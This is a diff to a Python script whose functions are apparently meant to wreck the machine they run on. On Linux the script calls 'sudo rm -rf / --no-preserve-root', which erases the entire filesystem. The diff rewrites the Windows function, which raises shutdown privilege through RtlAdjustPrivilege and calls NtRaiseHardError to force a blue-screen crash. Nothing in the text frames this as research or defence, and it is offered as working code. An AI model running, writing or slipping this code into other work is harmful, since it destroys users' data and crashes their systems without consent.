@@ -3,30 +3,15 @@ def bsod_linux():
   os.system('sudo rm -rf / --no-preserve-root')
 
 def bsod_win():
-  from ctypes import windll
-  from ctypes import c_int
-  from ctypes import c_uint
-  from ctypes import c_ulong
-  from ctypes import POINTER
-  from ctypes import byref
-
-  nullptr = POINTER(c_int)()
-
-  windll.ntdll.RtlAdjustPrivilege(
-      c_uint(19), 
-      c_uint(1), 
-      c_uint(0), 
-      byref(c_int())
-  )
-
-  windll.ntdll.NtRaiseHardError(
-      c_ulong(0xC000007B), 
-      c_ulong(0), 
-      nullptr, 
-      nullptr, 
-      c_uint(6), 
-      byref(c_uint())
-  )
+  import ctypes
+  ntdll = ctypes.windll.ntdll
+  prev_value = ctypes.c_bool()
+  res = ctypes.c_ulong()
+  ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(prev_value))
+  if not ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(res)):
+      print("BSOD Successfull!")
+  else:
+      print("BSOD Failed...")
 
 def main():
   import platform
